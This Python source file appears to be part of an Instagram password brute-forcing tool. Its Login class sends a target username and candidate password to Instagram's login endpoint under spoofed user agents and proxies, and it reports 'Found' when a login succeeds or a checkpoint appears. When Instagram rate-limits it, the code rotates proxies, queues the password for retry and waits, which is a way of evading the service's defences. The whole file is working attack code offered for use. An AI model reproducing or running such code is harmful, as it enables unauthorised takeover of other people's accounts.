import datetime
import json
import os
import time
import requests
from Printf import printf
from Proxy import proxy
from useragent import Useragent

# {"user":true,"userId":"***********","authenticated":true,"oneTapPrompt":true,"status":"ok"}
# ERRORS:
#    - checkpoint_required
#
#
# if "showAccountRecoveryModal" in resp_json:
#     if resp_json['showAccountRecoveryModal'] == True:
#         pass  # printf(f"Recovery [{self.t()}]: instagram showed account recovery modal", mt="warn")
#
#
# for key in resp_json:
#     printf(f"{str(resp_json[key]).replace('_', ' ').upper()}: '{resp_json[key]}'", mt="info")
# for cookie in response.cookies:
#     printf(f"Cookies ({cookie}): {response.cookies[cookie]}", mt="info")
#
#
# tw = os.get_terminal_size().columns  # tw=terminal widt
# printf("-" * (tw - 2), mt="error")
# printf(f"Warning [{self.t()}]: too many requests block message(%s)" % resp_json["message"], mt="warn")
# printf("-" * (tw - 2), mt="error")


class Login:
    def __init__(self, target: str, password: str, id:str, proxy_data: dict, controlPort: int, timeout:int, retry_passwords:list, rest:int=5):
        self.login_url = "https://www.instagram.com/accounts/login/ajax/"
        self.random_user_agent = Useragent.Devices().random()

        self.target = target
        self.password = password
        self.id = id
        self.proxy_data = proxy_data
        self.proxy_protocol = proxy_data["protocol"]
        self.proxy_ip = proxy_data["ip"]
        self.proxy_port = proxy_data["port"]
        self.proxy_password = proxy_data["password"]
        self.proxy_controlPort = controlPort
        self.timeout = timeout
        self.retry_passwords = retry_passwords
        self.rest = rest

    def t(self):
        return str(datetime.datetime.now().strftime("%Y/%m/%d %I:%M:%S %p"))
    def take_a_nap(self, data:dict):
        wait = 60 * self.rest  # w=wait
        at = self.t()
        print(f"[{at}] - {wait}s - [{self.proxy_ip}:{self.proxy_port}] - Reason({data['message']})")

        for i in range(wait):  # wait <rest-pm> minutes (pm=per minutes)
            time.sleep(0.999)
        # print("!! rest time done.")  # to go to a new line (avoiding inline data output)
    def Try(self):
        login_payload = f'username={self.target}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{self.password}&queryParams=%7B%7D&optIntoOneTap=false'
        headers = {
            'User-Agent': self.random_user_agent,
            'authority': 'www.instagram.com',
            'content-type': 'application/x-www-form-urlencoded',
            'accept': '*/*',
            'x-requested-with': 'XMLHttpRequest',
            'x-csrftoken': 'rn3aR7phKDodUHWdDfCGlERA7Gmhes8X',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.instagram.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
        }
        try:
            response = requests.post(self.login_url, headers=headers, data=login_payload,
                                    proxies={"http": "%s://%s:%s" % (self.proxy_protocol, self.proxy_ip, self.proxy_port),
                                             "https": "%s://%s:%s" % (self.proxy_protocol, self.proxy_ip, self.proxy_port)},
                                     timeout=self.timeout)
            if response.status_code in [200, 400]: # 200 ok or (400 bad request when there is a challenge, EX: {"message":"checkpoint_required","checkpoint_url":"/challenge/action/************/************/","lock":false,"flow_render_type":0,"status":"fail"})
                resp_json = json.loads(response.text)
                if "authenticated" in resp_json:
                    if resp_json['authenticated'] == True:
                        printf(f"Found: [{self.t()}] - {self.target} => '{self.password}' - [{response.status_code} {response.reason}]", mt="success")
                        return True
                    else:
                        # printf(f"[{self.t()}] - [{self.proxy_ip}:{self.proxy_port}] - [{self.target} => '{self.password}'] - [{response.status_code} {response.reason}]", mt="error")
                        return False
                elif "message" in resp_json:
                    if resp_json['message'] == "checkpoint_required":
                        printf(f"Found: [{self.t()}] - {self.target} => '{self.password}' - [{response.status_code} {response.reason}]", mt="success")
                        return True
                    else:
                        # printf(f"[{self.t()}] - [{self.proxy_ip}:{self.proxy_port}] - [{self.target} => '{self.password}'] - [{response.status_code} {response.reason}]", mt="error")
                        return False
            else:
                resp_json = json.loads(response.text)
                if "status" in resp_json:
                    if resp_json["status"] == "fail":
                        if not self.password in self.retry_passwords:
                            self.retry_passwords.append(self.password)
                        proxy.new(id=self.id, proxy_data=self.proxy_data, controlPort=self.proxy_controlPort)
                        if resp_json["message"] == "Please wait a few minutes before trying again.":
                            self.take_a_nap(data=resp_json)
                        return None
                elif "errors" in resp_json:
                    if not self.password in self.retry_passwords:
                        self.retry_passwords.append(self.password)
                    proxy.new(id=self.id, proxy_data=self.proxy_data, controlPort=self.proxy_controlPort)
                    self.take_a_nap(data=resp_json)
                    return None
        except Exception as error:
            pass # printf(f"Error [{self.t()}]: '{error}'", mt="error")